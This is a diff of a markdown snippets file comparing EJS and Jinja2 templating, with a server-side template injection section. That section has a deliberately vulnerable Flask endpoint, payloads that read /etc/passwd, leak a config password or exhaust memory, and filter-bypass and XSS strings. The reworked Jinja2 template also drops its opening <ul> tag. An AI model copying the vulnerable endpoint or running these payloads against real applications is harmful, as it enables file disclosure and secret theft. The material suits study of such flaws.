@@ -1,15 +1,8 @@
-### Jinja2 Template
+# Snippets
 
-```html
-<h1>Hello, {{ name }}!</h1>
-<ul>
-  {% for item in items %}
-  <li>{{ item }}</li>
-  {% endfor %}
-</ul>
-```
+## EJS
 
-### EJS Template
+### Template
 
 ```html
 <h1>Hello, <%= name %>!</h1>
@@ -20,18 +13,7 @@
 </ul>
 ```
 
-### HTML Output
-
-```html
-<h1>Hello, Alice!</h1>
-<ul>
-  <li>Apples</li>
-  <li>Bananas</li>
-  <li>Cherries</li>
-</ul>
-```
-
-### EJS Setup
+### Server
 
 ```js
 import express from "express";
@@ -48,7 +30,30 @@ app.get("/", (_, res) => {
 app.listen(3000);
 ```
 
-### Jinja2 Setup
+### Output
+
+```html
+<h1>Hello, Alice!</h1>
+<ul>
+  <li>Apples</li>
+  <li>Bananas</li>
+  <li>Cherries</li>
+</ul>
+```
+
+## Jinja2
+
+### Template
+
+```html
+<h1>Hello, {{ name }}!</h1>
+  {% for item in items %}
+  <li>{{ item }}</li>
+  {% endfor %}
+</ul>
+```
+
+### Server
 
 ```py
 from flask import Flask, render_template
@@ -57,14 +62,27 @@ app = Flask(__name__)
 
 @app.route("/")
 def home():
-    data = {"name": "Alice", "items": ["Apples", "Bananas", "Cherries"]}
+    data = {"name": "Bob", "items": ["Pepper", "Turmeric", "Ginger"]}
     return render_template("index.html", **data)
 
 if __name__ == "__main__":
     app.run(port=3000)
 ```
 
-### Jinja2 SSTI
+### Output
+
+```html
+<h1>Hello, Bob!</h1>
+<ul>
+  <li>Pepper</li>
+  <li>Turmeric</li>
+  <li>Ginger</li>
+</ul>
+```
+
+### SSTI
+
+#### Server
 
 ```py
 from flask import Flask, request, render_template_string
@@ -73,18 +91,32 @@ app = Flask(__name__)
 
 @app.route("/ssti", methods=["GET"])
 def ssti():
-    user_input = request.args.get("input", "")
-    template = f"Hello {user_input}"
+    template = request.args.get("template")
     return render_template_string(template)
 
 if __name__ == "__main__":
     app.run(port=3000)
 ```
 
-### Jinja2 Payloads
+#### Payloads
 
 ```py
 {{ "".join("A" * 10**8) }}
 {{ config["DATABASE_PASSWORD"] }}
-{{ "".__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read() }}
+{{ request.__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read() }}
+```
+
+#### Poor Sanitization
+
+```py
+template = template.replace("__", "")
+template = template.replace("[", "").replace("]", "")
+```
+
+#### Filter Bypasses
+
+```py
+{{ request["\x5f\x5fclass\x5f\x5f"] }}
+{{ request|attr("__class__") }}
+{{ "<script>alert(1);</script>"|safe }}
 ```
